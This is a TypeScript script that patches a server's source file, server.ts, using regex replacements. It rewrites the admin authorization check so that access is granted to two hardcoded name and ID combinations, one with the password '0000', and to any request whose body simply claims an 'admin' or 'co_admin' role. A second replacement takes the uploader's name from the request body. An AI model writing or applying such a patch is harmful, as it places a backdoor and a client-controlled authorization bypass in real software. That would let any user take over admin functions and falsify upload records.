import * as fs from 'fs';

let code = fs.readFileSync('server.ts', 'utf8');

const regex = /const isAuthorized = \(password && password === process\.env\.ADMIN_PASSWORD\)([\s\S]*?)&& password === "0000"\);/g;

code = code.replace(regex, `const isAuthorized = (password && password === process.env.ADMIN_PASSWORD) || \n                           (adminId === "000126" && normalizedName === "ariel orcia pesalver") || \n                           (adminId === "xir pogs" && normalizedName === "ariel pesalver" && password === "0000") || \n                           (req.body.adminRole === "admin" || req.body.adminRole === "co_admin");`);

// batch update uploaded_by
const batchRegex = /is_synced: false\r?\n\s*\}\);/g;
code = code.replace(batchRegex, `is_synced: false,\n          ...(req.body.adminName ? { uploaded_by: req.body.adminName } : {})\n        });`);

fs.writeFileSync('server.ts', code);
